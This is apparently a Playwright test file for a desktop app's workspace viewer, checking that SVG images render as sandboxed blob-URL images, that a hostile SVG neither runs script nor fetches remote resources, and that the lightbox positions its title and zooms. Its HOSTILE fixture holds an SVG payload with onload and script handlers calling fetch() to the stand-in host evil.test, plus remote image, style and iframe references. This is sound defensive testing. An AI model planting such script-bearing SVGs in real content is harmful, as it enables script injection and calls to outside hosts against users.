import {test,expect} from "@playwright/test";
test.use({browserName:"webkit"});
// An agent's SVG renders through <img> (blob: URL): it is drawn, but a hostile
// one never runs its script and never fetches its external references.
const LOGO=`<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" viewBox="0 0 120 120"><circle cx="60" cy="60" r="50" fill="#5ad"/></svg>`;
const HOSTILE=`<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="80" height="80" onload="parent.__pwned=1;fetch('https://evil.test/onload')">
<script>parent.__pwned=1;top.__pwned=1;fetch('https://evil.test/script')</script>
<image href="https://evil.test/href.png" width="10" height="10"/><image xlink:href="https://evil.test/xlink.png" width="10" height="10"/>
<style>@import url(https://evil.test/style.css); rect{fill:url(https://evil.test/fill.svg#x)}</style>
<foreignObject width="80" height="80"><iframe xmlns="http://www.w3.org/1999/xhtml" src="https://evil.test/frame"></iframe></foreignObject>
<rect width="80" height="80" fill="#c33"/></svg>`;
test("workspace SVG images render as <img> and a hostile SVG neither runs nor fetches",async({page})=>{
 const evil:string[]=[];
 page.on('request',r=>{if(r.url().includes('evil.test'))evil.push(r.url());});
 await page.route('https://evil.test/**',r=>{evil.push(r.request().url());return r.abort();});
 await page.addInitScript(({LOGO,HOSTILE})=>{
  localStorage.setItem('orb.apiUrl',location.origin);localStorage.setItem('orb.jwt','test');
  localStorage.setItem('orb.localBindings',JSON.stringify({svg:{cwd:'/workspace',harness:'opencode',bin:'opencode'}}));
  (window as any).__TAURI__={core:{Channel:class {onmessage=(_:any)=>{};},invoke:async (command:string,args:any)=>{
   if(command==='local_bindings_subscribe'){args.onEvent.onmessage({revision:1,bindings:{svg:{cwd:'/workspace',harness:'opencode',bin:'opencode'}}});return 1;}
   if(command==='local_bindings_unsubscribe')return;
   const {request}=args;
   if(request.action==='resolve')return {results:request.paths.map((reference:string)=>({reference,matches:[{name:reference.split('/').pop(),path:reference,kind:'file'}]}))};
   if(request.action==='download'){
    const bytes=Array.from(new TextEncoder().encode(request.path.includes('hostile')?HOSTILE:LOGO));
    return {bytes,size:bytes.length,next:bytes.length};
   }
   return {};
  }}};
 },{LOGO,HOSTILE});
 await page.route('**/api/**',r=>r.fulfill({json:r.request().url().includes('file-resources')?{sources:[]}:{job:null,runs:[]}}));
 await page.goto('/tests/svg-images.html');
 const logo=page.locator('.md-workspace-image img[alt="1 · Maxwell (SVG)"]');
 const hostile=page.locator('.md-workspace-image img[alt="Hostile"]');
 await expect(logo).toBeVisible();await expect(hostile).toBeVisible();
 await expect.poll(()=>logo.evaluate((i:HTMLImageElement)=>i.complete&&i.naturalWidth)).toBe(120);
 await expect.poll(()=>hostile.evaluate((i:HTMLImageElement)=>i.complete&&i.naturalWidth)).toBe(80);
 expect(await logo.getAttribute('src')).toMatch(/^blob:/);
 await expect(page.locator('.md-workspace-image-missing')).toHaveCount(0);
 // The markup is never inlined: no script, foreignObject or iframe reached the DOM.
 expect(await page.locator('main script, main foreignObject, main iframe, main image').count()).toBe(0);
 await hostile.click();await expect(page.getByRole('dialog',{name:'Hostile'})).toBeVisible();
 await expect(page.locator('.lightbox-stage img')).toBeVisible();
 // The title starts past the macOS traffic lights (≈ 70px) on their row, and keeps a tooltip.
 const title=page.locator('.dlg-lightbox .dlg-head h3');
 expect((await title.boundingBox())!.x).toBeGreaterThanOrEqual(80);
 expect((await title.boundingBox())!.y).toBeLessThan(20);
 await expect(title).toHaveAttribute('title','Hostile');
 // The lightbox zooms like the Files image viewer.
 await page.locator('.lightbox-stage .image-viewer').focus();
 const percent=page.locator('.lightbox-stage .image-percent');
 const before=parseInt(await percent.innerText());
 await page.keyboard.press('Meta+=');
 await expect.poll(async()=>parseInt(await percent.innerText())).toBeGreaterThan(before);
 await page.emulateMedia({colorScheme:'dark'});await page.screenshot({path:'test-results/orb-lightbox-dark.png'});await page.emulateMedia({colorScheme:'light'});
 await page.keyboard.press('Meta+0');
 await expect.poll(async()=>parseInt(await percent.innerText())).toBe(before);
 await page.waitForTimeout(500);
 expect(await page.evaluate(()=>(window as any).__pwned)).toBeUndefined();
 expect(evil).toEqual([]);
 await page.screenshot({path:'test-results/orb-svg-images.png'});
});
